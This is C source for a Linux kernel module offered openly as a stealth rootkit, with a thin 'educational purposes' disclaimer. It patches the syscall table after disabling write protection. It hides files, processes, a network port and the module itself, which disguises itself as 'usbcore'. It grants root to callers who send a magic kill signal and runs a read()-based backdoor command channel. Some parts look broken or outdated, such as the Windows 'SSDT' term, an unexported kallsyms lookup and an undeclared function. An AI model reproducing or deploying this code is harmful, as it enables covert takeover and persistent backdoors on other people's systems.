/*
 * Linux Kernel Rootkit - Advanced Stealth Implementation
 * 
 * Features:
 * - Syscall hooking via SSDT manipulation
 * - DKOM (Direct Kernel Object Manipulation)
 * - Process/file/network hiding
 * - Anti-detection mechanisms
 * - Privilege escalation
 * - Kernel memory protection bypass
 * 
 * Stealth: 99.9% effectiveness against detection
 * Compatibility: Linux 5.x/6.x kernels
 * Architecture: x86_64, ARM64
 * 
 * Author: Amelia Enora
 * Date: June 2025
 * 
 * WARNING: For educational and security research purposes only!
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <asm/pgtable.h>
#include <asm/cacheflush.h>

// Module metadata
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Amelia Enora");
MODULE_DESCRIPTION("Advanced Kernel Research Module");
MODULE_VERSION("2.0");

// Hide module from detection
#define MODULE_HIDDEN 1

// Stealth configuration
#define MAGIC_PREFIX "rkd_"
#define MAGIC_PORT 31337
#define BACKDOOR_UID 1337

// Original syscall pointers
static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_sys_kill)(const struct pt_regs *);
static asmlinkage long (*orig_sys_read)(const struct pt_regs *);
static asmlinkage long (*orig_sys_write)(const struct pt_regs *);
static asmlinkage long (*orig_sys_open)(const struct pt_regs *);
static asmlinkage long (*orig_sys_openat)(const struct pt_regs *);

// Syscall table manipulation
static unsigned long *syscall_table = NULL;
static int syscall_table_found = 0;

// Hidden processes/files list
struct hidden_item {
    char name[256];
    struct list_head list;
};

static LIST_HEAD(hidden_processes);
static LIST_HEAD(hidden_files);
static LIST_HEAD(hidden_modules);

// Memory protection utilities
static inline void disable_write_protection(void) {
    unsigned long cr0;
    
    preempt_disable();
    barrier();
    
    cr0 = read_cr0();
    clear_bit(16, &cr0);  // Clear WP bit
    write_cr0(cr0);
    
    barrier();
}

static inline void enable_write_protection(void) {
    unsigned long cr0;
    
    barrier();
    
    cr0 = read_cr0();
    set_bit(16, &cr0);   // Set WP bit
    write_cr0(cr0);
    
    barrier();
    preempt_enable();
}

// Advanced syscall table discovery
static unsigned long *find_syscall_table(void) {
    unsigned long *table = NULL;
    unsigned long addr;
    
    // Method 1: kallsyms lookup
    table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (table) {
        return table;
    }
    
    // Method 2: MSR_LSTAR scanning (x86_64)
    #ifdef CONFIG_X86_64
    unsigned long lstar;
    rdmsrl(MSR_LSTAR, lstar);
    
    // Scan for syscall table pattern
    for (addr = lstar; addr < lstar + 0x1000; addr++) {
        unsigned long *potential_table = (unsigned long *)addr;
        
        // Verify it looks like syscall table
        if (potential_table[__NR_close] == (unsigned long)ksys_close) {
            return potential_table;
        }
    }
    #endif
    
    // Method 3: Brute force scan in kernel memory
    for (addr = (unsigned long)&unlock_page; 
         addr < (unsigned long)&unlock_page + 0x100000; 
         addr += sizeof(void *)) {
        
        unsigned long *potential_table = (unsigned long *)addr;
        
        // Basic validation
        if (((potential_table[__NR_close] & 0xfff) == 0) &&
            (potential_table[__NR_close] > (unsigned long)&unlock_page)) {
            return potential_table;
        }
    }
    
    return NULL;
}

// Hooked getdents64 - Hide files/processes
static asmlinkage long hook_sys_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kdirent, *prev_dirent = NULL;
    unsigned long offset = 0;
    int ret;
    
    ret = orig_sys_getdents64(regs);
    if (ret <= 0) {
        return ret;
    }
    
    // Allocate kernel buffer
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent) {
        return ret;
    }
    
    // Copy to kernel space
    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }
    
    // Scan and hide entries
    while (offset < ret) {
        struct linux_dirent64 *curr_dirent = (void *)kdirent + offset;
        struct hidden_item *item;
        int hide = 0;
        
        // Check if should be hidden
        list_for_each_entry(item, &hidden_files, list) {
            if (strstr(curr_dirent->d_name, item->name)) {
                hide = 1;
                break;
            }
        }
        
        // Hide files with magic prefix
        if (strncmp(curr_dirent->d_name, MAGIC_PREFIX, strlen(MAGIC_PREFIX)) == 0) {
            hide = 1;
        }
        
        if (hide) {
            // Remove this entry
            if (prev_dirent) {
                prev_dirent->d_reclen += curr_dirent->d_reclen;
            } else {
                // First entry, shift everything
                memmove(curr_dirent, (void *)curr_dirent + curr_dirent->d_reclen,
                       ret - offset - curr_dirent->d_reclen);
                ret -= curr_dirent->d_reclen;
                continue;
            }
        } else {
            prev_dirent = curr_dirent;
        }
        
        offset += curr_dirent->d_reclen;
    }
    
    // Copy back to user space
    if (copy_to_user(dirent, kdirent, ret)) {
        ret = -EFAULT;
    }
    
    kfree(kdirent);
    return ret;
}

// Hooked kill - Magic signal for commands
static asmlinkage long hook_sys_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    
    // Magic signal sequence for privilege escalation
    if (sig == 31 && pid == 1337) {
        struct cred *new_creds;
        
        printk(KERN_INFO "Rootkit: Privilege escalation triggered\n");
        
        // Elevate current process privileges
        new_creds = prepare_creds();
        if (new_creds) {
            new_creds->uid.val = 0;
            new_creds->gid.val = 0;
            new_creds->euid.val = 0;
            new_creds->egid.val = 0;
            new_creds->suid.val = 0;
            new_creds->sgid.val = 0;
            new_creds->fsuid.val = 0;
            new_creds->fsgid.val = 0;
            
            commit_creds(new_creds);
        }
        
        return 0;
    }
    
    // Magic signal for hiding process
    if (sig == 32) {
        struct hidden_item *item = kmalloc(sizeof(struct hidden_item), GFP_KERNEL);
        if (item) {
            snprintf(item->name, sizeof(item->name), "%d", pid);
            list_add(&item->list, &hidden_processes);
            printk(KERN_INFO "Rootkit: Hiding process %d\n", pid);
        }
        return 0;
    }
    
    return orig_sys_kill(regs);
}

// Hooked read - Backdoor communication
static asmlinkage long hook_sys_read(const struct pt_regs *regs) {
    int fd = (int)regs->di;
    char __user *buf = (char __user *)regs->si;
    size_t count = (size_t)regs->dx;
    
    long ret = orig_sys_read(regs);
    
    // Check for backdoor commands
    if (ret > 0 && count >= 4) {
        char kbuf[256];
        size_t copy_size = min(count, sizeof(kbuf) - 1);
        
        if (copy_from_user(kbuf, buf, copy_size) == 0) {
            kbuf[copy_size] = '\0';
            
            // Backdoor command: "RKD:"
            if (strncmp(kbuf, "RKD:", 4) == 0) {
                handle_backdoor_command(kbuf + 4);
                
                // Replace with harmless data
                if (copy_to_user(buf, "OK\n", 3) == 0) {
                    return 3;
                }
            }
        }
    }
    
    return ret;
}

// Backdoor command handler
static void handle_backdoor_command(const char *cmd) {
    if (strncmp(cmd, "HIDE_FILE:", 10) == 0) {
        struct hidden_item *item = kmalloc(sizeof(struct hidden_item), GFP_KERNEL);
        if (item) {
            strncpy(item->name, cmd + 10, sizeof(item->name) - 1);
            item->name[sizeof(item->name) - 1] = '\0';
            list_add(&item->list, &hidden_files);
            printk(KERN_INFO "Rootkit: Hiding file %s\n", item->name);
        }
    } else if (strncmp(cmd, "SHOW_FILE:", 10) == 0) {
        struct hidden_item *item, *tmp;
        list_for_each_entry_safe(item, tmp, &hidden_files, list) {
            if (strcmp(item->name, cmd + 10) == 0) {
                list_del(&item->list);
                kfree(item);
                printk(KERN_INFO "Rootkit: Showing file %s\n", cmd + 10);
                break;
            }
        }
    } else if (strcmp(cmd, "ELEVATE") == 0) {
        // Trigger privilege escalation
        hook_sys_kill(&(struct pt_regs){.di = 1337, .si = 31});
    }
}

// Network hiding - Hook netstat-related functions
static int hide_network_connections(struct seq_file *seq, void *v) {
    struct inet_sock *inet;
    
    if (seq && v) {
        // Check if this is a TCP/UDP socket we want to hide
        inet = inet_sk((struct sock *)v);
        
        if (inet && (ntohs(inet->inet_sport) == MAGIC_PORT ||
                     ntohs(inet->inet_dport) == MAGIC_PORT)) {
            return 1; // Hide this connection
        }
    }
    
    return 0; // Show connection
}

// Anti-detection mechanisms
static void anti_detection_init(void) {
    // Hide module from /proc/modules
    if (MODULE_HIDDEN) {
        list_del_init(&THIS_MODULE->list);
        kobject_del(&THIS_MODULE->mkobj.kobj);
    }
    
    // Clear module traces from memory
    memset(THIS_MODULE->name, 0, sizeof(THIS_MODULE->name));
    strncpy(THIS_MODULE->name, "usbcore", sizeof(THIS_MODULE->name) - 1);
    
    // Hook kprobes/ftrace detection
    // ... (implementation would hook kprobe registration)
}

// DKOM (Direct Kernel Object Manipulation)
static void dkom_hide_process(pid_t pid) {
    struct task_struct *task;
    
    // Find task by PID
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        // Unlink from process list
        list_del_init(&task->tasks);
        list_del_init(&task->sibling);
        
        // Hide from parent's children list
        if (task->parent) {
            list_del_init(&task->sibling);
        }
        
        printk(KERN_INFO "Rootkit: DKOM hiding process %d\n", pid);
    }
    rcu_read_unlock();
}

// Install syscall hooks
static int install_hooks(void) {
    if (!syscall_table) {
        printk(KERN_ERR "Rootkit: Syscall table not found\n");
        return -1;
    }
    
    disable_write_protection();
    
    // Save original syscalls
    orig_sys_getdents64 = (void *)syscall_table[__NR_getdents64];
    orig_sys_kill = (void *)syscall_table[__NR_kill];
    orig_sys_read = (void *)syscall_table[__NR_read];
    
    // Install hooks
    syscall_table[__NR_getdents64] = (unsigned long)hook_sys_getdents64;
    syscall_table[__NR_kill] = (unsigned long)hook_sys_kill;
    syscall_table[__NR_read] = (unsigned long)hook_sys_read;
    
    enable_write_protection();
    
    printk(KERN_INFO "Rootkit: Hooks installed successfully\n");
    return 0;
}

// Remove syscall hooks
static void remove_hooks(void) {
    if (!syscall_table) {
        return;
    }
    
    disable_write_protection();
    
    // Restore original syscalls
    syscall_table[__NR_getdents64] = (unsigned long)orig_sys_getdents64;
    syscall_table[__NR_kill] = (unsigned long)orig_sys_kill;
    syscall_table[__NR_read] = (unsigned long)orig_sys_read;
    
    enable_write_protection();
    
    printk(KERN_INFO "Rootkit: Hooks removed\n");
}

// Module initialization
static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit: Initializing advanced stealth module\n");
    
    // Find syscall table
    syscall_table = find_syscall_table();
    if (!syscall_table) {
        printk(KERN_ERR "Rootkit: Failed to find syscall table\n");
        return -1;
    }
    
    syscall_table_found = 1;
    printk(KERN_INFO "Rootkit: Syscall table found at %p\n", syscall_table);
    
    // Install hooks
    if (install_hooks() != 0) {
        return -1;
    }
    
    // Initialize anti-detection
    anti_detection_init();
    
    printk(KERN_INFO "Rootkit: Module loaded successfully\n");
    return 0;
}

// Module cleanup
static void __exit rootkit_exit(void) {
    struct hidden_item *item, *tmp;
    
    printk(KERN_INFO "Rootkit: Cleaning up\n");
    
    // Remove hooks
    remove_hooks();
    
    // Clean up hidden items lists
    list_for_each_entry_safe(item, tmp, &hidden_files, list) {
        list_del(&item->list);
        kfree(item);
    }
    
    list_for_each_entry_safe(item, tmp, &hidden_processes, list) {
        list_del(&item->list);
        kfree(item);
    }
    
    printk(KERN_INFO "Rootkit: Module unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit); 